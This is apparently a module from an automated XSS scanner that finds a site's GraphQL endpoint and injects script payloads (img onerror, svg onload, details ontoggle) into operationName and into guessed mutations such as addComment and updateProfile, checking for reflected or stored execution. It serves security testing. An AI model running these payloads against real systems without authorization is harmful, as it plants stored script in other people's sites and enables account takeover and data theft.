"""GraphQL XSS — introspection + common mutations + operationName reflection."""

from __future__ import annotations

import hashlib
import json
import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

from intellixss.analysis.reflection import is_payload_effective
from intellixss.http.client import HttpClient
from intellixss.models import InjectionContext, XSSFinding
from intellixss.payloads.generator import make_marker, mark_call

_GQL_PATHS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query", "/graph",
]

_COMMON_MUTATIONS = [
    ("addComment", "content", {"content": "X", "postId": "1"}),
    ("createComment", "body", {"body": "X", "articleId": "1"}),
    ("updateProfile", "bio", {"bio": "X", "name": "u"}),
    ("createPost", "title", {"title": "X", "body": "y"}),
    ("search", "query", {"query": "X"}),
    ("contactSupport", "message", {"message": "X", "subject": "s"}),
]


def gql_payloads(marker: str) -> List[str]:
    """Mutation values for *marker*, so a dialog can be attributed to them."""
    a = mark_call(marker)
    return [
        f"<img src=x onerror={a}>",
        f"<svg/onload={a}>",
        f'"><img src=x onerror={a}>',
        f"<details open ontoggle={a}>",
    ]


def _gql_urls(base: str) -> List[str]:
    origin = f"{urlparse(base).scheme}://{urlparse(base).netloc}"
    return [urljoin(origin + "/", p.lstrip("/")) for p in _GQL_PATHS]


async def _post_gql(
    client: HttpClient, url: str, query: str, variables: Optional[dict] = None,
    operation_name: Optional[str] = None,
):
    body: Dict[str, Any] = {"query": query}
    if variables is not None:
        body["variables"] = variables
    if operation_name:
        body["operationName"] = operation_name
    return await client.request("POST", url, json_body=body)


async def scan_graphql_xss(
    client: HttpClient,
    base_url: str,
    *,
    browser=None,
    max_payloads: int = 4,
    log=None,
) -> List[XSSFinding]:
    log = log or (lambda *a, **k: None)
    findings: List[XSSFinding] = []

    # Discover live GraphQL endpoint
    endpoint = None
    for u in _gql_urls(base_url):
        st, body, _, _ = await _post_gql(client, u, "{ __typename }")
        if st and body and (
            "data" in body or "__typename" in body or "errors" in body
            or "Must provide" in body or "GraphQL" in body
        ):
            endpoint = u
            log(f"    [graphql] endpoint {u}", "info")
            break
    if not endpoint:
        log("    [graphql] no endpoint found", "debug")
        return findings

    # operationName reflection in HTML errors
    canary = f"gn{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
    marker = make_marker(hashlib.md5(f"{base_url}{time.time()}".encode()).hexdigest()[:8])
    evil_payload = f"<img src=x onerror={mark_call(marker)}>"
    evil_name = f"{canary}{evil_payload}"
    st, body, hdrs, fin = await _post_gql(
        client, endpoint, "query X { __typename }", operation_name=evil_name
    )
    if st and body and canary in body:
        ok, tag = is_payload_effective(body, evil_payload, "html_text")
        if ok or "<img" in body:
            findings.append(
                XSSFinding(
                    url=fin or endpoint,
                    parameter="operationName",
                    method="POST",
                    context=InjectionContext.HTML_TEXT,
                    payload=evil_payload,
                    evidence=f"graphql_operationName_reflection:{tag if ok else 'raw'}",
                    vulnerability_type="graphql_reflected",
                    confidence=0.75,
                )
            )
            log("    [VULN] GraphQL operationName reflection", "vuln")

    payloads = gql_payloads(marker)

    # Common mutations with XSS in string fields
    for mut, field, base_vars in _COMMON_MUTATIONS:
        for payload in payloads[:max_payloads]:
            vars_ = dict(base_vars)
            vars_[field] = payload
            # Build simple mutation
            arg_list = ", ".join(f"${k}: String" for k in vars_)
            field_args = ", ".join(f"{k}: ${k}" for k in vars_)
            query = f"mutation({arg_list}) {{ {mut}({field_args}) {{ id }} }}"
            st, body, hdrs, fin = await _post_gql(
                client, endpoint, query, variables=vars_
            )
            if st == 0 or not body:
                continue
            # Check response + base page for stored
            ok, tag = is_payload_effective(body, payload, "html_text")
            stored = False
            if not ok and payload in body:
                ok, tag = True, "json_contains_payload"
            if not ok:
                st2, body2, _, fin2 = await client.request("GET", base_url)
                if st2 and body2 and (
                    payload in body2
                    or is_payload_effective(body2, payload, "html_text")[0]
                ):
                    ok, tag = True, "stored_on_base_page"
                    stored = True
                    fin = fin2 or base_url
            if not ok:
                # invalid mutation is common — stop this mut after first try pattern
                break
            finding = XSSFinding(
                url=fin or endpoint,
                parameter=f"gql:{mut}.{field}",
                method="POST",
                context=InjectionContext.JSON_VALUE,
                payload=payload,
                evidence=f"graphql_mutation:{tag}",
                vulnerability_type="graphql_stored" if stored else "graphql",
                confidence=0.8,
            )
            if browser and browser.available and stored:
                br = await browser.confirm(finding.url, payload=payload, marker=marker)
                if br.confirmed:
                    finding.browser_confirmed = True
                    finding.confidence = 0.95
            findings.append(finding)
            log(f"    [VULN] GraphQL {mut}.{field}", "vuln")
            return findings
    return findings
